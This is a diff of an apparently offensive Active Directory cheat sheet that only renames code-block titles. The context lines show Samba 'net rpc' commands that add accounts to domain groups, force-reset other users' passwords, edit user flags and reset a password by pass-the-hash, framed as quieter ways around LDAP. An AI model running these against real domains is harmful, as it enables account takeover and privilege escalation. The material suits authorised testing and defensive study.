@@ -6,7 +6,7 @@
 
 Add a member to a domain group via SAMR over RPC. Useful when LDAP write is blocked but SAMR is open.
 
-```sh title:"Add member to group via SAMR over RPC"
+```sh title:"Netrpc Add member to group via SAMR over RPC"
 net rpc group addmem "$group" "$target_user" -U "$domain"/"$user"%"$pass" -S "$rhost_name"
 ```
 <!-- cheat
@@ -22,7 +22,7 @@ var target_user
 
 Read group membership over SAMR. Quieter than LDAP for fast peeks.
 
-```sh title:"Read group membership over SAMR"
+```sh title:"Netrpc Read group membership over SAMR"
 net rpc group members "$group" -U "$domain"/"$user"%"$pass" -S "$rhost_name"
 ```
 <!-- cheat
@@ -37,7 +37,7 @@ var rhost_name
 
 Same membership read, target specified as FQDN. Use when NetBIOS resolution is broken.
 
-```sh title:"Read group members targeting DC by FQDN"
+```sh title:"Netrpc Read group members targeting DC by FQDN"
 net rpc group members "$group" -U "$domain"/"$user"%'$pass' -S "$rhost_name"
 ```
 <!-- cheat
@@ -52,7 +52,7 @@ var rhost_name
 
 Convenience variant for adding a service account into a group. Same primitive, named for clarity.
 
-```sh title:"Add service account into group via SAMR"
+```sh title:"Netrpc Add service account into group via SAMR"
 net rpc group addmem "$group" "$service_account" -U "$domain"/"$user"%"$pass" -S "$rhost_name"
 ```
 <!-- cheat
@@ -68,7 +68,7 @@ var rhost_name
 
 Force-set a target user's password via SAMR. Requires Reset Password right.
 
-```sh title:"Force set target password via SAMR (needs reset right)"
+```sh title:"Netrpc Force set target password via SAMR (needs reset right)"
 net rpc password "$target_user" "$target_pass" -U "$domain"/"$user"%"$pass" -S "$domain"
 ```
 <!-- cheat
@@ -83,7 +83,7 @@ var target_pass
 
 Same password reset, alternate authenticated user format pointed at a specific DC by name.
 
-```sh title:"Password reset, alternate user format vs DC by name"
+```sh title:"Netrpc Password reset, alternate user format vs DC by name"
 net rpc password "$target_user" "$target_pass" -U "$domain"/"$user"%"$pass" -S "$rhost_name"
 ```
 <!-- cheat
@@ -99,7 +99,7 @@ var target_pass
 
 Same password reset, DC referenced by FQDN.
 
-```sh title:"Password reset, DC referenced by FQDN"
+```sh title:"Netrpc Password reset, DC referenced by FQDN"
 net rpc password "$target_user" "$target_pass" -U "$domain"/"$user"%'$pass' -S "$rhost_name"
 ```
 <!-- cheat
@@ -115,7 +115,7 @@ var target_pass
 
 Open the SAMR-side user editor to flip flags and reset attributes.
 
-```sh title:"SAMR user editor for flag / attribute changes"
+```sh title:"Netrpc SAMR user editor for flag / attribute changes"
 net rpc user edit "$target_user" -U "$domain"/"$user"%'$pass' -S "$rhost_name"
 ```
 <!-- cheat
@@ -130,7 +130,7 @@ var target_user
 
 Pass-the-hash variant of the password reset using `pth-net` (LM:NT format).
 
-```sh title:"Pass-the-hash password reset via pth-net"
+```sh title:"Netrpc Pass-the-hash password reset via pth-net"
 pth-net rpc password "$target_user" "$target_pass" -U "$domain"/"$user"%"$hash:$hash" -S "$rhost_name"
 ```
 <!-- cheat
